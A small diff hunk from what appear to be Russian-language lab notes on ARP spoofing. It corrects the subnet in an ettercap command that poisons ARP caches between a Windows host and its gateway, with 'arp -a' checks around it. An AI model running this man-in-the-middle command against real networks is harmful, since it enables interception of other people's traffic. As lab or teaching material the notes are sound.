@@ -20,7 +20,7 @@ ARP спуфинг
 win arp -a
 ```
 ```
-lan# ettercap -T -M arp //192.168.110.<ip windows> // //192.168.110.1//
+lan# ettercap -T -M arp //192.168.100.<ip windows> // //192.168.100.1//
 ```
 ```
 win arp -a
